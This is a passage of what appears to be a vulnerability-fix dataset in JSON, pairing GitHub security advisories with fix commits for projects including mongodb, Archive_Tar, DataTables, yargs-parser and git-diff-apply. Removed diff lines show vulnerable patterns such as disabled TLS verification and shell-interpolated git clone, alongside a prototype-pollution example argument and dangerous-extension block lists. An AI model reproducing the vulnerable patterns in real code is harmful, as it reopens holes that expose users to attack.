            "patch_content":"From 76365515ff8754b9f705e56428dd0d7efa7f541b Mon Sep 17 00:00:00 2001\nFrom: Matt Broadstone <mbroadst@mongodb.com>\nDate: Fri, 5 Feb 2021 18:37:36 -0500\nSubject: [PATCH] fix: always authorize TLS endpoints, use servername for SNI\n (#159)\n\nTLS endpoints should always be authorized.\nIn order to properly communicate with GCP's KMS servers\nwe need to provide a `servername`, so the endpoint can serve the\ncorrect TLS certificate.\n---\n bindings\/node\/lib\/stateMachine.js | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/bindings\/node\/lib\/stateMachine.js b\/bindings\/node\/lib\/stateMachine.js\nindex 2543dc550..a67fa697d 100644\n--- a\/bindings\/node\/lib\/stateMachine.js\n+++ b\/bindings\/node\/lib\/stateMachine.js\n@@ -217,7 +217,7 @@ module.exports = function(modules) {\n     kmsRequest(request) {\n       const parsedUrl = request.endpoint.split(':');\n       const port = parsedUrl[1] != null ? Number.parseInt(parsedUrl[1], 10) : HTTPS_PORT;\n-      const options = { host: parsedUrl[0], port, rejectUnauthorized: false };\n+      const options = { host: parsedUrl[0], servername: parsedUrl[0], port };\n       const message = request.message;\n \n       return new Promise((resolve, reject) => {",
            "code_diff":"@@ -217,7 +217,7 @@ module.exports = function(modules) {\n     kmsRequest(request) {\n       const parsedUrl = request.endpoint.split(':');\n       const port = parsedUrl[1] != null ? Number.parseInt(parsedUrl[1], 10) : HTTPS_PORT;\n-      const options = { host: parsedUrl[0], port, rejectUnauthorized: false };\n+      const options = { host: parsedUrl[0], servername: parsedUrl[0], port };\n       const message = request.message;\n \n       return new Promise((resolve, reject) => {"
        },
        {
            "index":490,
            "vuln_id":"GHSA-hf4q-52x6-4p57",
            "cwe_id":"{'CWE-79'}",
            "score":4.8,
            "chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/d9bae9df873c2d2a13a2eb08d512019d49ebca68'}",
            "dataset":"osv",
            "summary":"Unrestricted file upload leads to stored cross-site scripting in Microweber Microweber prior to version 1.2.12 allows unrestricted file upload, which could lead to stored cross-site scripting.",
            "published_date":"2022-03-11",
            "chain_len":1,
            "project":"https:\/\/github.com\/microweber\/microweber",
            "commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/d9bae9df873c2d2a13a2eb08d512019d49ebca68",
            "commit_sha":"d9bae9df873c2d2a13a2eb08d512019d49ebca68",
            "patch":"SINGLE",
            "chain_ord":"['d9bae9df873c2d2a13a2eb08d512019d49ebca68']",
            "before_first_fix_commit":"{'8902c415144823c48b056f881aa00ceb1f5d350f'}",
            "last_fix_commit":"d9bae9df873c2d2a13a2eb08d512019d49ebca68",
            "chain_ord_pos":1.0,
            "commit_datetime":"03\/09\/2022, 14:55:02",
            "message":"update",
            "author":"Peter Ivanov",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 0, 'total': 1}",
            "files":"{'src\/MicroweberPackages\/Utils\/System\/Files.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/d9bae9df873c2d2a13a2eb08d512019d49ebca68\/src%2FMicroweberPackages%2FUtils%2FSystem%2FFiles.php', 'patch': \"@@ -591,6 +591,7 @@ function get_dangerous_files_extentions()\\n             'py',\\n             'alfa',\\n             'asp',\\n+            'aspx',\\n             'htaccess',\\n             'exe',\\n             'msi',\"}}",
            "message_norm":"update",
            "language":"ro",
            "entities":"[('update', 'ACTION', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/MicroweberPackages\/Utils\/System\/Files.php'])",
            "num_files":1.0,
            "patch_content":"From d9bae9df873c2d2a13a2eb08d512019d49ebca68 Mon Sep 17 00:00:00 2001\nFrom: Peter Ivanov <peter@microweber.com>\nDate: Wed, 9 Mar 2022 16:55:02 +0200\nSubject: [PATCH] update\n\n---\n src\/MicroweberPackages\/Utils\/System\/Files.php | 1 +\n 1 file changed, 1 insertion(+)\n\ndiff --git a\/src\/MicroweberPackages\/Utils\/System\/Files.php b\/src\/MicroweberPackages\/Utils\/System\/Files.php\nindex 5e3ff8bfffd..220d42fdf0a 100644\n--- a\/src\/MicroweberPackages\/Utils\/System\/Files.php\n+++ b\/src\/MicroweberPackages\/Utils\/System\/Files.php\n@@ -591,6 +591,7 @@ function get_dangerous_files_extentions()\n             'py',\n             'alfa',\n             'asp',\n+            'aspx',\n             'htaccess',\n             'exe',\n             'msi',",
            "code_diff":"@@ -591,6 +591,7 @@ function get_dangerous_files_extentions()\n             'py',\n             'alfa',\n             'asp',\n+            'aspx',\n             'htaccess',\n             'exe',\n             'msi',"
        },
        {
            "index":569,
            "vuln_id":"GHSA-75c5-f4gw-38r9",
            "cwe_id":"{'CWE-74'}",
            "score":7.8,
            "chain":"{'https:\/\/github.com\/pear\/Archive_Tar\/commit\/0670a05fdab997036a3fc3ef113b8f5922e574da'}",
            "dataset":"osv",
            "summary":"Multiple vulnerabilities through filename manipulation in Archive_Tar Archive_Tar through 1.4.10 has :\/\/ filename sanitization only to address phar attacks, and thus any other stream-wrapper attack (such as file:\/\/ to overwrite files) can still succeed. See: https:\/\/github.com\/pear\/Archive_Tar\/issues\/33",
            "published_date":"2021-04-22",
            "chain_len":1,
            "project":"https:\/\/github.com\/pear\/Archive_Tar",
            "commit_href":"https:\/\/github.com\/pear\/Archive_Tar\/commit\/0670a05fdab997036a3fc3ef113b8f5922e574da",
            "commit_sha":"0670a05fdab997036a3fc3ef113b8f5922e574da",
            "patch":"SINGLE",
            "chain_ord":"['0670a05fdab997036a3fc3ef113b8f5922e574da']",
            "before_first_fix_commit":"{'bbb4f10f71a1da2715ec6d9a683f4f23c507a49b'}",
            "last_fix_commit":"0670a05fdab997036a3fc3ef113b8f5922e574da",
            "chain_ord_pos":1.0,
            "commit_datetime":"11\/19\/2020, 08:52:43",
            "message":"Fixes #33 - ensure we catch additional malicious\/crafted filenames",
            "author":"Michiel Rook",
            "comments":null,
            "stats":"{'additions': 4, 'deletions': 4, 'total': 8}",
            "files":"{'Archive\/Tar.php': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pear\/Archive_Tar\/raw\/0670a05fdab997036a3fc3ef113b8f5922e574da\/Archive%2FTar.php', 'patch': '@@ -1730,7 +1730,7 @@ public function _readHeader($v_binary_data, &$v_header)\\n \\n         \/\/ ----- Extract the properties\\n         $v_header[\\'filename\\'] = rtrim($v_data[\\'filename\\'], \"\\\\0\");\\n-        if ($this->_maliciousFilename($v_header[\\'filename\\'])) {\\n+        if ($this->_isMaliciousFilename($v_header[\\'filename\\'])) {\\n             $this->_error(\\n                 \\'Malicious .tar detected, file \"\\' . $v_header[\\'filename\\'] .\\n                 \\'\" will not install in desired directory tree\\'\\n@@ -1800,9 +1800,9 @@ private function _tarRecToSize($tar_size)\\n      *\\n      * @return bool\\n      *\/\\n-    private function _maliciousFilename($file)\\n+    private function _isMaliciousFilename($file)\\n     {\\n-        if (strpos($file, \\'phar:\/\/\\') === 0) {\\n+        if (strpos($file, \\':\/\/\\') !== false) {\\n             return true;\\n         }\\n         if (strpos($file, \\'..\/\\') !== false || strpos($file, \\'..\\\\\\\\\\') !== false) {\\n@@ -1838,7 +1838,7 @@ public function _readLongHeader(&$v_header)\\n \\n         $v_filename = rtrim(substr($v_filename, 0, $v_filesize), \"\\\\0\");\\n         $v_header[\\'filename\\'] = $v_filename;\\n-        if ($this->_maliciousFilename($v_filename)) {\\n+        if ($this->_isMaliciousFilename($v_filename)) {\\n             $this->_error(\\n                 \\'Malicious .tar detected, file \"\\' . $v_filename .\\n                 \\'\" will not install in desired directory tree\\''}}",
            "message_norm":"fixes #33 - ensure we catch additional malicious\/crafted filenames",
            "language":"en",
            "entities":"[('fixes', 'ACTION', ''), ('#33', 'ISSUE', ''), ('ensure', 'ACTION', ''), ('malicious', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['Archive\/Tar.php'])",
            "num_files":1.0,
            "patch_content":"From 0670a05fdab997036a3fc3ef113b8f5922e574da Mon Sep 17 00:00:00 2001\nFrom: Michiel Rook <michiel@michielrook.nl>\nDate: Thu, 19 Nov 2020 09:52:43 +0100\nSubject: [PATCH] Fixes #33 - ensure we catch additional malicious\/crafted\n filenames\n\n---\n Archive\/Tar.php | 8 ++++----\n 1 file changed, 4 insertions(+), 4 deletions(-)\n\ndiff --git a\/Archive\/Tar.php b\/Archive\/Tar.php\nindex 5a52ce8..9271074 100644\n--- a\/Archive\/Tar.php\n+++ b\/Archive\/Tar.php\n@@ -1730,7 +1730,7 @@ public function _readHeader($v_binary_data, &$v_header)\n \n         \/\/ ----- Extract the properties\n         $v_header['filename'] = rtrim($v_data['filename'], \"\\0\");\n-        if ($this->_maliciousFilename($v_header['filename'])) {\n+        if ($this->_isMaliciousFilename($v_header['filename'])) {\n             $this->_error(\n                 'Malicious .tar detected, file \"' . $v_header['filename'] .\n                 '\" will not install in desired directory tree'\n@@ -1800,9 +1800,9 @@ private function _tarRecToSize($tar_size)\n      *\n      * @return bool\n      *\/\n-    private function _maliciousFilename($file)\n+    private function _isMaliciousFilename($file)\n     {\n-        if (strpos($file, 'phar:\/\/') === 0) {\n+        if (strpos($file, ':\/\/') !== false) {\n             return true;\n         }\n         if (strpos($file, '..\/') !== false || strpos($file, '..\\\\') !== false) {\n@@ -1838,7 +1838,7 @@ public function _readLongHeader(&$v_header)\n \n         $v_filename = rtrim(substr($v_filename, 0, $v_filesize), \"\\0\");\n         $v_header['filename'] = $v_filename;\n-        if ($this->_maliciousFilename($v_filename)) {\n+        if ($this->_isMaliciousFilename($v_filename)) {\n             $this->_error(\n                 'Malicious .tar detected, file \"' . $v_filename .\n                 '\" will not install in desired directory tree'",
            "code_diff":"@@ -1730,7 +1730,7 @@ public function _readHeader($v_binary_data, &$v_header)\n \n         \/\/ ----- Extract the properties\n         $v_header['filename'] = rtrim($v_data['filename'], \"\\0\");\n-        if ($this->_maliciousFilename($v_header['filename'])) {\n+        if ($this->_isMaliciousFilename($v_header['filename'])) {\n             $this->_error(\n                 'Malicious .tar detected, file \"' . $v_header['filename'] .\n                 '\" will not install in desired directory tree'\n@@ -1800,9 +1800,9 @@ private function _tarRecToSize($tar_size)\n      *\n      * @return bool\n      *\/\n-    private function _maliciousFilename($file)\n+    private function _isMaliciousFilename($file)\n     {\n-        if (strpos($file, 'phar:\/\/') === 0) {\n+        if (strpos($file, ':\/\/') !== false) {\n             return true;\n         }\n         if (strpos($file, '..\/') !== false || strpos($file, '..\\\\') !== false) {\n@@ -1838,7 +1838,7 @@ public function _readLongHeader(&$v_header)\n \n         $v_filename = rtrim(substr($v_filename, 0, $v_filesize), \"\\0\");\n         $v_header['filename'] = $v_filename;\n-        if ($this->_maliciousFilename($v_filename)) {\n+        if ($this->_isMaliciousFilename($v_filename)) {\n             $this->_error(\n                 'Malicious .tar detected, file \"' . $v_filename .\n                 '\" will not install in desired directory tree'"
        },
        {
            "index":363,
            "vuln_id":"GHSA-m7j4-fhg6-xf5v",
            "cwe_id":"{'CWE-1321'}",
            "score":7.3,
            "chain":"{'https:\/\/github.com\/DataTables\/DataTablesSrc\/commit\/a51cbe99fd3d02aa5582f97d4af1615d11a1ea03'}",
            "dataset":"osv",
            "summary":"Prototype pollution in datatables.net All versions of package datatables.net are vulnerable to Prototype Pollution due to an incomplete fix for https:\/\/snyk.io\/vuln\/SNYK-JS-DATATABLESNET-598806.",
            "published_date":"2020-12-17",
            "chain_len":1,
            "project":"https:\/\/github.com\/DataTables\/DataTablesSrc",
            "commit_href":"https:\/\/github.com\/DataTables\/DataTablesSrc\/commit\/a51cbe99fd3d02aa5582f97d4af1615d11a1ea03",
            "commit_sha":"a51cbe99fd3d02aa5582f97d4af1615d11a1ea03",
            "patch":"SINGLE",
            "chain_ord":"['a51cbe99fd3d02aa5582f97d4af1615d11a1ea03']",
            "before_first_fix_commit":"{'d878f888142e4811f839ea3e099ad1de64d74698'}",
            "last_fix_commit":"a51cbe99fd3d02aa5582f97d4af1615d11a1ea03",
            "chain_ord_pos":1.0,
            "commit_datetime":"10\/25\/2020, 10:00:54",
            "message":"Fix: Possible prototype pollution if `constructor` were used in a data property name\n\nhttps:\/\/github.com\/418sec\/huntr\/pull\/827",
            "author":"Allan Jardine",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'js\/core\/core.data.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/DataTables\/DataTablesSrc\/raw\/a51cbe99fd3d02aa5582f97d4af1615d11a1ea03\/js%2Fcore%2Fcore.data.js', 'patch': \"@@ -357,7 +357,7 @@ function _fnSetObjectDataFn( mSource )\\n \\t\\t\\tfor ( var i=0, iLen=a.length-1 ; i<iLen ; i++ )\\n \\t\\t\\t{\\n \\t\\t\\t\\t\/\/ Protect against prototype pollution\\n-\\t\\t\\t\\tif (a[i] === '__proto__') {\\n+\\t\\t\\t\\tif (a[i] === '__proto__' || a[i] === 'constructor') {\\n \\t\\t\\t\\t\\tthrow new Error('Cannot set prototype values');\\n \\t\\t\\t\\t}\"}}",
            "message_norm":"fix: possible prototype pollution if `constructor` were used in a data property name\n\nhttps:\/\/github.com\/418sec\/huntr\/pull\/827",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('prototype pollution', 'SECWORD', ''), ('https:\/\/github.com\/418sec\/huntr\/pull\/827', 'URL', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['js\/core\/core.data.js'])",
            "num_files":1.0,
            "patch_content":"From a51cbe99fd3d02aa5582f97d4af1615d11a1ea03 Mon Sep 17 00:00:00 2001\nFrom: Allan Jardine <allan.jardine@sprymedia.co.uk>\nDate: Sun, 25 Oct 2020 10:00:54 +0000\nSubject: [PATCH] Fix: Possible prototype pollution if `constructor` were used\n in a data property name\n\nhttps:\/\/github.com\/418sec\/huntr\/pull\/827\n---\n js\/core\/core.data.js | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/js\/core\/core.data.js b\/js\/core\/core.data.js\nindex 46ba8049c..d08a20995 100644\n--- a\/js\/core\/core.data.js\n+++ b\/js\/core\/core.data.js\n@@ -357,7 +357,7 @@ function _fnSetObjectDataFn( mSource )\n \t\t\tfor ( var i=0, iLen=a.length-1 ; i<iLen ; i++ )\n \t\t\t{\n \t\t\t\t\/\/ Protect against prototype pollution\n-\t\t\t\tif (a[i] === '__proto__') {\n+\t\t\t\tif (a[i] === '__proto__' || a[i] === 'constructor') {\n \t\t\t\t\tthrow new Error('Cannot set prototype values');\n \t\t\t\t}",
            "code_diff":"@@ -357,7 +357,7 @@ function _fnSetObjectDataFn( mSource )\n \t\t\tfor ( var i=0, iLen=a.length-1 ; i<iLen ; i++ )\n \t\t\t{\n \t\t\t\t\/\/ Protect against prototype pollution\n-\t\t\t\tif (a[i] === '__proto__') {\n+\t\t\t\tif (a[i] === '__proto__' || a[i] === 'constructor') {\n \t\t\t\t\tthrow new Error('Cannot set prototype values');\n \t\t\t\t}"
        },
        {
            "index":10,
            "vuln_id":"GHSA-wrwf-pmmj-w989",
            "cwe_id":"{'CWE-203'}",
            "score":5.9,
            "chain":"{'https:\/\/github.com\/bcgit\/bc-java\/commit\/a00b684465b38d722ca9a3543b8af8568e6bad5c'}",
            "dataset":"osv",
            "summary":"Observable Discrepancy in BouncyCastle BouncyCastle TLS prior to version 1.0.3, when configured to use the JCE (Java Cryptography Extension) for cryptographic functions, provides a weak Bleichenbacher oracle when any TLS cipher suite using RSA key exchange is negotiated. An attacker can recover the private key from a vulnerable application. This vulnerability is referred to as \"ROBOT.\"",
            "published_date":"2022-05-13",
            "chain_len":1,
            "project":"https:\/\/github.com\/bcgit\/bc-java",
            "commit_href":"https:\/\/github.com\/bcgit\/bc-java\/commit\/a00b684465b38d722ca9a3543b8af8568e6bad5c",
            "commit_sha":"a00b684465b38d722ca9a3543b8af8568e6bad5c",
            "patch":"SINGLE",
            "chain_ord":"['a00b684465b38d722ca9a3543b8af8568e6bad5c']",
            "before_first_fix_commit":"{'199be1bdc892dcb3360af1b5a887a7e133d2cdac'}",
            "last_fix_commit":"a00b684465b38d722ca9a3543b8af8568e6bad5c",
            "chain_ord_pos":1.0,
            "commit_datetime":"12\/12\/2017, 01:41:43",
            "message":"Confirm size of decrypted PMS before using",
            "author":"Peter Dettman",
            "comments":"{'com_1': {'author': 'carnil', 'datetime': '12\/12\/2017, 20:44:47', 'body': 'CVE-2017-13098'}, 'com_2': {'author': 'bcgit', 'datetime': '12\/12\/2017, 23:34:09', 'body': 'This is also available in the current beta in https:\/\/www.bouncycastle.org\/betas 159b09 or later.'}, 'com_3': {'author': 'zenithravi', 'datetime': '12\/14\/2017, 09:12:16', 'body': 'Any plan ? When fix for CVE-2017-13098 (159b09) will be released ?'}, 'com_4': {'author': 'bcgit', 'datetime': '12\/14\/2017, 11:05:34', 'body': \"We're hoping to have 1.59 out in the next week or so.\"}}",
            "stats":"{'additions': 5, 'deletions': 1, 'total': 6}",
            "files":"{'tls\/src\/main\/java\/org\/bouncycastle\/tls\/crypto\/impl\/jcajce\/JceDefaultTlsCredentialedDecryptor.java': {'additions': 5, 'deletions': 1, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/bcgit\/bc-java\/raw\/a00b684465b38d722ca9a3543b8af8568e6bad5c\/tls%2Fsrc%2Fmain%2Fjava%2Forg%2Fbouncycastle%2Ftls%2Fcrypto%2Fimpl%2Fjcajce%2FJceDefaultTlsCredentialedDecryptor.java', 'patch': '@@ -97,7 +97,11 @@ protected TlsSecret safeDecryptPreMasterSecret(TlsCryptoParameters cryptoParams,\\n         {\\n             Cipher c = crypto.createRSAEncryptionCipher();\\n             c.init(Cipher.DECRYPT_MODE, rsaServerPrivateKey);\\n-            M = c.doFinal(encryptedPreMasterSecret);\\n+            byte[] m = c.doFinal(encryptedPreMasterSecret);\\n+            if (m != null && m.length == 48)\\n+            {\\n+                M = m;\\n+            }\\n         }\\n         catch (Exception e)\\n         {'}}",
            "message_norm":"confirm size of decrypted pms before using",
            "language":"en",
            "entities":null,
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tls\/src\/main\/java\/org\/bouncycastle\/tls\/crypto\/impl\/jcajce\/JceDefaultTlsCredentialedDecryptor.java'])",
            "num_files":1.0,
            "patch_content":"From a00b684465b38d722ca9a3543b8af8568e6bad5c Mon Sep 17 00:00:00 2001\nFrom: Peter Dettman <peter.dettman@bouncycastle.org>\nDate: Tue, 12 Dec 2017 08:41:43 +0700\nSubject: [PATCH] Confirm size of decrypted PMS before using\n\n---\n ...\/impl\/jcajce\/JceDefaultTlsCredentialedDecryptor.java     | 6 +++++-\n 1 file changed, 5 insertions(+), 1 deletion(-)\n\ndiff --git a\/tls\/src\/main\/java\/org\/bouncycastle\/tls\/crypto\/impl\/jcajce\/JceDefaultTlsCredentialedDecryptor.java b\/tls\/src\/main\/java\/org\/bouncycastle\/tls\/crypto\/impl\/jcajce\/JceDefaultTlsCredentialedDecryptor.java\nindex c4ab53206f..cea1df8b9f 100644\n--- a\/tls\/src\/main\/java\/org\/bouncycastle\/tls\/crypto\/impl\/jcajce\/JceDefaultTlsCredentialedDecryptor.java\n+++ b\/tls\/src\/main\/java\/org\/bouncycastle\/tls\/crypto\/impl\/jcajce\/JceDefaultTlsCredentialedDecryptor.java\n@@ -97,7 +97,11 @@ protected TlsSecret safeDecryptPreMasterSecret(TlsCryptoParameters cryptoParams,\n         {\n             Cipher c = crypto.createRSAEncryptionCipher();\n             c.init(Cipher.DECRYPT_MODE, rsaServerPrivateKey);\n-            M = c.doFinal(encryptedPreMasterSecret);\n+            byte[] m = c.doFinal(encryptedPreMasterSecret);\n+            if (m != null && m.length == 48)\n+            {\n+                M = m;\n+            }\n         }\n         catch (Exception e)\n         {",
            "code_diff":"@@ -97,7 +97,11 @@ protected TlsSecret safeDecryptPreMasterSecret(TlsCryptoParameters cryptoParams,\n         {\n             Cipher c = crypto.createRSAEncryptionCipher();\n             c.init(Cipher.DECRYPT_MODE, rsaServerPrivateKey);\n-            M = c.doFinal(encryptedPreMasterSecret);\n+            byte[] m = c.doFinal(encryptedPreMasterSecret);\n+            if (m != null && m.length == 48)\n+            {\n+                M = m;\n+            }\n         }\n         catch (Exception e)\n         {"
        },
        {
            "index":456,
            "vuln_id":"GHSA-p9pc-299p-vxgp",
            "cwe_id":"{'CWE-915'}",
            "score":5.3,
            "chain":"{'https:\/\/github.com\/yargs\/yargs-parser\/commit\/63810ca1ae1a24b08293a4d971e70e058c7a41e2', 'https:\/\/github.com\/yargs\/yargs-parser\/commit\/1c417bd0b42b09c475ee881e36d292af4fa2cc36'}",
            "dataset":"osv",
            "summary":"yargs-parser Vulnerable to Prototype Pollution Affected versions of `yargs-parser` are vulnerable to prototype pollution. Arguments are not properly sanitized, allowing an attacker to modify the prototype of `Object`, causing the addition or modification of an existing property that will exist on all objects.  \nParsing the argument `--foo.__proto__.bar baz'` adds a `bar` property with value `baz` to all objects. This is only exploitable if attackers have control over the arguments being passed to `yargs-parser`.\n\n\n\n## Recommendation\n\nUpgrade to versions 13.1.2, 15.0.1, 18.1.1 or later.",
            "published_date":"2020-09-04",
            "chain_len":2,
            "project":"https:\/\/github.com\/yargs\/yargs-parser",
            "commit_href":"https:\/\/github.com\/yargs\/yargs-parser\/commit\/1c417bd0b42b09c475ee881e36d292af4fa2cc36",
            "commit_sha":"1c417bd0b42b09c475ee881e36d292af4fa2cc36",
            "patch":"MULTI",
            "chain_ord":"['63810ca1ae1a24b08293a4d971e70e058c7a41e2', '1c417bd0b42b09c475ee881e36d292af4fa2cc36']",
            "before_first_fix_commit":"{'e93a345e1e585ba5df97c1da438673e7f2e8909b'}",
            "last_fix_commit":"1c417bd0b42b09c475ee881e36d292af4fa2cc36",
            "chain_ord_pos":2.0,
            "commit_datetime":"03\/10\/2021, 19:14:27",
            "message":"fix(security): address GHSA-p9pc-299p-vxgp (#362)\n\nUpdate release automation to allow for back ports.",
            "author":"Benjamin E. Coe",
            "comments":"{'com_1': {'author': 'kennethalegre19', 'datetime': '10\/19\/2021, 05:07:29', 'body': '`.github\/workflows\/release-please.yml'}}",
            "stats":"{'additions': 15, 'deletions': 0, 'total': 15}",
            "files":"{'.github\/workflows\/release-please.yml': {'additions': 15, 'deletions': 0, 'changes': 15, 'status': 'added', 'raw_url': 'https:\/\/github.com\/yargs\/yargs-parser\/raw\/1c417bd0b42b09c475ee881e36d292af4fa2cc36\/.github%2Fworkflows%2Frelease-please.yml', 'patch': '@@ -0,0 +1,15 @@\\n+on:\\n+   push:\\n+     branches:\\n+       - v5.x.x\\n+name: release-please\\n+jobs:\\n+  release-please:\\n+    runs-on: ubuntu-latest\\n+    steps:\\n+      - uses: google-github-actions\/release-please-action@v2\\n+        with:\\n+          token: ${{ secrets.GITHUB_TOKEN }}\\n+          release-type: node\\n+          package-name: yargs-parser\\n+          default-branch: v5.x.x'}}",
            "message_norm":"fix(security): address ghsa-p9pc-299p-vxgp (#362)\n\nupdate release automation to allow for back ports.",
            "language":"en",
            "entities":"[('fix(security', 'SECWORD', ''), ('ghsa-p9pc-299p-vxgp', 'VULNID', 'GHSA'), ('#362', 'ISSUE', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['.github\/workflows\/release-please.yml'])",
            "num_files":1.0,
            "patch_content":"From 1c417bd0b42b09c475ee881e36d292af4fa2cc36 Mon Sep 17 00:00:00 2001\nFrom: \"Benjamin E. Coe\" <bencoe@google.com>\nDate: Wed, 10 Mar 2021 11:14:27 -0800\nSubject: [PATCH] fix(security): address GHSA-p9pc-299p-vxgp (#362)\n\nUpdate release automation to allow for back ports.\n---\n .github\/workflows\/release-please.yml | 15 +++++++++++++++\n 1 file changed, 15 insertions(+)\n create mode 100644 .github\/workflows\/release-please.yml\n\ndiff --git a\/.github\/workflows\/release-please.yml b\/.github\/workflows\/release-please.yml\nnew file mode 100644\nindex 00000000..757c171a\n--- \/dev\/null\n+++ b\/.github\/workflows\/release-please.yml\n@@ -0,0 +1,15 @@\n+on:\n+   push:\n+     branches:\n+       - v5.x.x\n+name: release-please\n+jobs:\n+  release-please:\n+    runs-on: ubuntu-latest\n+    steps:\n+      - uses: google-github-actions\/release-please-action@v2\n+        with:\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          release-type: node\n+          package-name: yargs-parser\n+          default-branch: v5.x.x",
            "code_diff":"new file mode 100644\n@@ -0,0 +1,15 @@\n+on:\n+   push:\n+     branches:\n+       - v5.x.x\n+name: release-please\n+jobs:\n+  release-please:\n+    runs-on: ubuntu-latest\n+    steps:\n+      - uses: google-github-actions\/release-please-action@v2\n+        with:\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          release-type: node\n+          package-name: yargs-parser\n+          default-branch: v5.x.x"
        },
        {
            "index":940,
            "vuln_id":"GHSA-84cm-v6jp-gjmr",
            "cwe_id":"{'CWE-78'}",
            "score":9.8,
            "chain":"{'https:\/\/github.com\/kellyselden\/git-diff-apply\/commit\/106d61d3ae723b4257c2a13e67b95eb40a27e0b5'}",
            "dataset":"osv",
            "summary":"OS command injection in git-diff-apply In \"index.js\" file line 240, the run command executes the git command with a user controlled variable called remoteUrl. This affects git-diff-apply all versions prior to 0.22.2.",
            "published_date":"2020-02-14",
            "chain_len":1,
            "project":"https:\/\/github.com\/kellyselden\/git-diff-apply",
            "commit_href":"https:\/\/github.com\/kellyselden\/git-diff-apply\/commit\/106d61d3ae723b4257c2a13e67b95eb40a27e0b5",
            "commit_sha":"106d61d3ae723b4257c2a13e67b95eb40a27e0b5",
            "patch":"SINGLE",
            "chain_ord":"['106d61d3ae723b4257c2a13e67b95eb40a27e0b5']",
            "before_first_fix_commit":"{'bfcc903a961d9f17bde1889cf49745a2dffefd73'}",
            "last_fix_commit":"106d61d3ae723b4257c2a13e67b95eb40a27e0b5",
            "chain_ord_pos":1.0,
            "commit_datetime":"01\/06\/2020, 12:05:14",
            "message":"spawn git clone\n\nto prevent injecting a command",
            "author":"Kelly Selden",
            "comments":null,
            "stats":"{'additions': 2, 'deletions': 1, 'total': 3}",
            "files":"{'src\/index.js': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/kellyselden\/git-diff-apply\/raw\/106d61d3ae723b4257c2a13e67b95eb40a27e0b5\/src%2Findex.js', 'patch': \"@@ -18,6 +18,7 @@ const resolveConflicts = require('.\/resolve-conflicts');\\n const commitAndTag = require('.\/commit-and-tag');\\n const gitRemoveAll = require('.\/git-remove-all');\\n const createCustomRemote = require('.\/create-custom-remote');\\n+const { runWithSpawn } = require('.\/run');\\n \\n const { isGitClean } = gitStatus;\\n const { gitConfigInit } = gitInit;\\n@@ -222,7 +223,7 @@ module.exports = async function gitDiffApply({\\n     _tmpDir = await tmpDir();\\n     tmpWorkingDir = _tmpDir;\\n \\n-    await utils.run(`git clone ${remoteUrl} ${_tmpDir}`);\\n+    await runWithSpawn('git', ['clone', remoteUrl, _tmpDir]);\\n \\n     \/\/ needed because we are going to be committing in here\\n     await gitConfigInit({ cwd: _tmpDir });\"}}",
            "message_norm":"spawn git clone\n\nto prevent injecting a command",
            "language":"en",
            "entities":"[('prevent', 'ACTION', ''), ('injecting a command', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/index.js'])",
            "num_files":1.0,
            "patch_content":"From 106d61d3ae723b4257c2a13e67b95eb40a27e0b5 Mon Sep 17 00:00:00 2001\nFrom: Kelly Selden <kellyselden@gmail.com>\nDate: Mon, 6 Jan 2020 12:05:14 +0000\nSubject: [PATCH] spawn git clone\n\nto prevent injecting a command\n---\n src\/index.js | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\ndiff --git a\/src\/index.js b\/src\/index.js\nindex a0d19aaf..d02f754f 100644\n--- a\/src\/index.js\n+++ b\/src\/index.js\n@@ -18,6 +18,7 @@ const resolveConflicts = require('.\/resolve-conflicts');\n const commitAndTag = require('.\/commit-and-tag');\n const gitRemoveAll = require('.\/git-remove-all');\n const createCustomRemote = require('.\/create-custom-remote');\n+const { runWithSpawn } = require('.\/run');\n \n const { isGitClean } = gitStatus;\n const { gitConfigInit } = gitInit;\n@@ -222,7 +223,7 @@ module.exports = async function gitDiffApply({\n     _tmpDir = await tmpDir();\n     tmpWorkingDir = _tmpDir;\n \n-    await utils.run(`git clone ${remoteUrl} ${_tmpDir}`);\n+    await runWithSpawn('git', ['clone', remoteUrl, _tmpDir]);\n \n     \/\/ needed because we are going to be committing in here\n     await gitConfigInit({ cwd: _tmpDir });",
            "code_diff":"@@ -18,6 +18,7 @@ const resolveConflicts = require('.\/resolve-conflicts');\n const commitAndTag = require('.\/commit-and-tag');\n const gitRemoveAll = require('.\/git-remove-all');\n const createCustomRemote = require('.\/create-custom-remote');\n+const { runWithSpawn } = require('.\/run');\n \n const { isGitClean } = gitStatus;\n const { gitConfigInit } = gitInit;\n@@ -222,7 +223,7 @@ module.exports = async function gitDiffApply({\n     _tmpDir = await tmpDir();\n     tmpWorkingDir = _tmpDir;\n \n-    await utils.run(`git clone ${remoteUrl} ${_tmpDir}`);\n+    await runWithSpawn('git', ['clone', remoteUrl, _tmpDir]);\n \n     \/\/ needed because we are going to be committing in here\n     await gitConfigInit({ cwd: _tmpDir });"
        },
        {
            "index":633,
            "vuln_id":"GHSA-vmjw-c2vp-p33c",
            "cwe_id":"{'CWE-681'}",
